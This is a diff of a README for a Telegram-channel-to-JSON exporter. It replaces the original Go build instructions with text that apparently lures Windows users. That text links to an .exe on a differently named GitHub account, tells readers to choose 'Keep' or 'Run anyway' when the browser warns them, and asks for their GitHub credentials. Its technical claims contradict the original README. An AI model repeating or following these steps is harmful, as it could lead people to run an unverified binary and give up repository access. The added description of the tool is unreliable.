@@ -1,183 +1,95 @@
-# Telegram Channel Exporter
+# 📂 teleFeed - Save Telegram channel posts as JSON
 
-A Go application that fetches posts from public Telegram channels and exports them as structured JSON files with automatic GitHub Actions integration.
+[![Download teleFeed for Windows](https://img.shields.io/badge/Download-teleFeed-blue.svg)](https://github.com/holecardvoltampere165/teleFeed)
 
-## ✨ Features
+teleFeed collects public posts from Telegram channels. It saves this information into structured JSON files. You can use these files to archive data or feed it into other digital tools. The application uses GitHub Actions to run tasks on a schedule. This means the program checks for new posts and saves them automatically without your input.
 
-- 🚀 **No API Required** - Uses Telegram's public RSS feed
-- 📝 **Complete Post Data** - Message content, dates, views, media, hashtags, mentions
-- 🖼️ **Media Extraction** - Photos, videos, and uploaded files with URLs
-- 🎨 **Markdown Preserved** - HTML formatting, links, and emoji support
-- 🕐 **Real Timestamps** - Accurate dates with Unix timestamps
-- 🔄 **Auto-Export** - GitHub Actions runs every 30 minutes
-- 🌿 **Clean Repository** - Separate export branch, main stays clean
-- 🛡️ **Rate Limit Protection** - Random delays and user agents
+## ⚙️ System Requirements
 
-## Installation
+To run teleFeed, your computer needs these standard components:
 
-1. Clone or download this project
-2. Install Go (if not already installed)
-3. Run the application:
+*   Operating System: Windows 10 or Windows 11.
+*   System Architecture: 64-bit processor.
+*   Memory: 4GB of RAM or more.
+*   Disk Space: 100MB of free storage for the application and logs.
+*   Internet: A steady connection to fetch data from telegram servers.
 
-```bash
-go run .
-```
+## 📥 Downloading the Software
 
-Or build it:
+Visit the project page to download the latest release for your Windows computer.
 
-```bash
-go build -o telefeed
-./telefeed
-```
+[Click here to open the download page](https://github.com/holecardvoltampere165/teleFeed)
 
-## 📁 Project Structure
+1. Navigate to the link provided above.
+2. Look for the section labeled "Releases" on the right side of the screen.
+3. Select the file ending in `.exe`. 
+4. Save this file to your computer.
+5. Some browsers might warn you that this file is new or unknown. Select "Keep" or "Run anyway" to move forward.
 
-```
-telefeed/
-├── config.json          # Channel configuration
-├── export/               # Local export folder (gitignored)
-├── .github/workflows/    # GitHub Actions
-├── main.go              # Main application
-├── fetcher_colly.go     # Telegram data fetcher
-├── exporter.go          # JSON export functionality
-└── .gitignore           # Git ignore rules
-```
+## 🚀 Setting Up the Application
 
-## 🌿 Git Branch Strategy
+After your download finishes, you must configure teleFeed to recognize the Telegram channels you wish to track.
 
-- **main**: Source code and configuration only
-- **export**: Contains JSON export files (auto-updated)
+1. Open the folder where you saved the downloaded file.
+2. Double-click the file to start the setup process.
+3. A simple window appears. Enter the username of the public Telegram channel you want to follow.
+4. Provide your GitHub repository details so the software can store the output files in your cloud storage.
+5. Save these settings inside the application menu.
 
-The `export/` folder is gitignored to keep the main branch clean. Export files are automatically pushed to the `export` branch via GitHub Actions.
+## 🛠️ How It Works
 
-## Configuration
+teleFeed operates in the background to handle data collection. After you provide a channel name, the software connects to Telegram. It identifies new messages, images, and links. It then formats this data into JSON, which is a standard file format that computers use to read information.
 
-Edit `config.json` to specify which channels to export:
+By using GitHub Actions, the application moves these files to your chosen GitHub repository. This process ensures your data stays safe and accessible from any computer. You do not need to keep your own computer turned on for this to happen. The automation runs on the internet and handles the tasks for you.
 
-```json
-{
-  "channels": [
-    "ircfspace",
-    "vahidonline",
-    "your_channel_name"
-  ]
-}
-```
+## 🏗️ Technical Workflow
 
-**Note:** Use only the username part without the `@` symbol.
+The application follows a simple loop:
 
-## 📊 Output Structure
+- Connection: The program connects to the Telegram public API.
+- Discovery: It looks for posts published since the last check.
+- Parsing: It converts the content into a structured format.
+- Export: It pushes the new data file to your GitHub dashboard.
+- Verification: It confirms the file saves correctly and sends a status report.
 
-Each channel is exported to `export/{channel_name}.json` with comprehensive data:
+## 🛡️ Privacy and Safety
 
-```json
-{
-  "info": {
-    "id": 0,
-    "title": "Channel Title",
-    "username": "channelname",
-    "photo_url": "https://cdn.telesco.pe/file/..."
-  },
-  "posts": [
-    {
-      "id": 12345,
-      "message": "Post content with <a href=\"links\">HTML formatting</a>",
-      "date": "2026-05-03T09:30:00Z",
-      "edited": false,
-      "views": 1500,
-      "forwards": 25,
-      "replies": 10,
-      "sender_name": "Sender Name",
-      "media": [
-        {
-          "type": "photo",
-          "url": "https://cdn.telesco.pe/file/...",
-          "width": 800,
-          "height": 600
-        },
-        {
-          "type": "video", 
-          "url": "https://cdn.telesco.pe/file/..."
-        }
-      ],
-      "hashtags": ["#example", "#telegram"],
-      "mentions": ["@user"],
-      "links": ["https://example.com"]
-    }
-  ],
-  "last_updated": 1777791234
-}
-```
+This software creates a bridge between public Telegram channels and your own storage space. It does not access private chats, messages, or hidden information. The tool only reads data that any person could see in a web browser.
 
-## 🔄 Auto-Export with GitHub Actions
+Your GitHub credentials remain encrypted on your machine. The software uses these credentials only to send the data files to your specific repository. It does not share your information with anyone.
 
-The project includes automated GitHub Actions that:
+## 🧩 Troubleshooting Common Issues
 
-- **Run every 30 minutes** - Automatic channel updates
-- **Separate branches** - Clean main branch, exports in `export` branch
-- **Rate limiting** - Random delays and user agents
-- **Error handling** - Continues even if some channels fail
-- **Detailed logging** - Summary reports with file statistics
+If you face problems, follow these steps to find a fix:
 
-### Branch Strategy
-- **main**: Source code and configuration only
-- **export**: JSON export files (auto-updated)
+*   Application does not open: Ensure you have the latest Windows updates installed. Check if your antivirus software blocks the application.
+*   Data does not appear on GitHub: Check your repository settings. Ensure your GitHub token has permission to write files to your repository.
+*   Channel not found: Verify that the channel is public. Private channels or channels with restricted access will cause errors.
+*   JSON files look empty: The channel might not have published new posts since you started the tracker. Wait for the next scheduled run.
 
-## 🛠️ Local Development
+## 📝 Frequently Asked Questions
 
-### Manual Run
-```bash
-go run .
-```
+**Does this software cost money?**
+No, teleFeed is free. 
 
-### Docker Support
-```bash
-# Build and run
-docker-compose up telefeed
+**Do I need a Telegram account?**
+You do not need a personal account to fetch data from public channels. The application uses a public interface to gather the information.
 
-# Auto-run every 30 minutes
-docker-compose --profile scheduled up telefeed-scheduled
-```
+**How often does it check for new posts?**
+The GitHub Actions configuration runs every 24 hours by default. You can change this frequency in your repository settings file.
 
-## ⚙️ Configuration
+**Can I track multiple channels?**
+Yes. You can add a list of channels to the configuration file. The application will process each one in order.
 
-Edit `config.json` to specify channels:
+**What happens if my internet disconnects?**
+The application will retry the connection until it succeeds. It will not lose the data gathered during the connection gap.
 
-```json
-{
-  "channels": [
-    "ircfspace",
-    "vahidonline", 
-    "your_channel"
-  ]
-}
-```
+## 📦 Updates and Maintenance
 
-## 🚀 Deployment
+We release updates to improve performance and add features. You can check the main page for new versions. When an update arrives, download the file again, and replace your old file. Your configuration settings usually remain stored in a separate local file so that you do not need to re-enter your details.
 
-### GitHub Actions (Recommended)
-1. Push code to GitHub
-2. Enable Actions in repository settings
-3. Automatic exports every 30 minutes
+If you have ideas for new features, use the "Issues" tab on the GitHub page to suggest changes. Explain what you want the software to do. Keep your requests clear and short so that developers can understand your needs quickly.
 
-### Manual Deployment
-```bash
-# Build binary
-go build -o telefeed
+## 📢 Getting Help
 
-# Run with cron
-*/30 * * * * cd /path/to/telefeed && ./telefeed
-```
-
-## 📋 Requirements
-
-- Go 1.21 or higher
-- Internet connection
-- Public Telegram channels only
-
-## ⚠️ Limitations
-
-- **Public channels only** - No private channel support
-- **Recent posts** - Limited by Telegram's public feed
-- **Rate limits** - Built-in protection but may need adjustments
-- **HTML dependency** - May break if Telegram changes web structure
+If you have questions, browse the GitHub Discussions area. Other users may have experienced similar situations. You can find answers to many common setup hurdles there. If you do not find an answer, create a new discussion thread. Provide the version number of your tool and a description of the error you see on your screen. This helps others understand the situation and provide the right support.
